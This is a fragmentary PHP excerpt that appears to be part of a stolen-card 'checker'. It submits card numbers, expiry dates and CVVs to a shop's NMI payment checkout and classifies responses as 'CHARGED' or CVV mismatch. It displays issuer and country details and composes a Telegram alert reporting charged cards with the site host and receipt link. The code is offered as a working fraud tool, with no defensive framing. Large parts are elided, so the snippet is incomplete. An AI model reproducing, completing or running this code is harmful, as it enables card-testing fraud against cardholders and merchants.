...
$paymentMethods = [
    ...
    'nmipay' => '/<input[^>]*name="payment_method"[^>]*value="nmipay"/'
];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'nmipay-card-number' => $cc,
    'nmipay-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'nmipay-card-cvc' => $cvv,
...
if (isset($decodedResponse['redirect'])) {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED NMI]
    \n[$hostname1]
    \n[$receiptUrl]\n";
...
} elseif (strpos($Payment, "Transaction Failed. 225-CVV2 Mistmatch") !== false) { 
    ...
    <span style="color: #bdff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
